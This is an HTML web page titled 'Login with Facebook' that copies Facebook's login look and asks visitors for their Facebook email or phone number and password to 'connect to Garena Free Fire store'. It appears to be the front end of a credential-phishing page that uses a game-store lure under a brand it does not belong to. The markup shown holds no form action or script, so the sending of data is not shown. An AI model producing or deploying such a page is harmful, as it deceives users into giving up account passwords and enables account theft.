<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="/style.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <title>Login with Facebook</title>
</head>
<body>
    <div class="div">
        <div class="header">
            <img src="/fbmain.png" alt="png">
        </div>
        <div class="mainlogo">
            <img src="/Untitled.png" alt="">
            <p>Login into your Facebook account to connect to Garena Free Fire store</p>
        </div>
        <div class="box">
            <input type="text" class="text-mail" placeholder="Mobile number or email address">
            <input type="text" class="text-mail" placeholder="Facebook password">
            <input type="button" class="text-btn1" value="Login">
            <input type="button" class="text-btn2" value="Creat New Account">
            <div class="box-links">
                <a href="#">Forget password?</a>
                
            </div>
        </div>
    </div>
</body>
</html>
